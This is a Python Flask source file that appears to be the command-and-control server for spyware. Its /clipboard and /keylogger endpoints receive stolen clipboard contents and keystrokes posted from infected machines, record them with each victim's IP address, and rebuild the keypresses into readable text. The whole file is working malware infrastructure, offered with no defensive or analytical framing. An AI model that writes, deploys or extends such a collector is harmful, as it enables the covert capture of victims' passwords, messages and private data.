from flask import Flask, request
import logging
import json

app = Flask(__name__)

# Configure logging for clipboard data
clipboard_logger = logging.getLogger('clipboardLogger')
clipboard_logger.setLevel(logging.INFO)
clipboard_handler = logging.FileHandler('/var/log/c2_clipboard.log')
clipboard_handler.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
clipboard_logger.addHandler(clipboard_handler)

# Configure logging for keylogger data
keylogger_logger = logging.getLogger('keyloggerLogger')
keylogger_logger.setLevel(logging.INFO)
keylogger_handler = logging.FileHandler('/var/log/keylogger.log')
keylogger_handler.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
keylogger_logger.addHandler(keylogger_handler)

@app.route('/clipboard', methods=['POST'])
def clipboard():
    data = request.json
    client_ip = request.remote_addr
    log_message = f"Received clipboard data from {client_ip}: {data}"
    print(log_message)
    clipboard_logger.info(log_message)
    # Additional readable format
    clipboard_logger.info(f"Client IP: {client_ip}")
    clipboard_logger.info(f"Clipboard Data: {json.dumps(data, indent=4)}")
    return "Clipboard data received", 200

@app.route('/keylogger', methods=['POST'])
def keylogger():
    data = request.json
    client_ip = request.remote_addr
    log_message = f"Received keylogger data from {client_ip}: {data}"
    print(log_message)
    keylogger_logger.info(log_message)
    keylogger_logger.info(f"Client IP: {client_ip}")
    keylogger_logger.info(f"Keylogger Data: {json.dumps(data, indent=4)}")

    # Log each keypress in a more readable format
    for entry in data.get('keystrokes', []):
        timestamp = entry.get('timestamp')
        key = entry.get('key')
        if key == 'Key.space':
            key = ' '
        keylogger_logger.info(f"Timestamp: {timestamp} - Key pressed: {key}")
    return "Keylogger data received", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=0000)
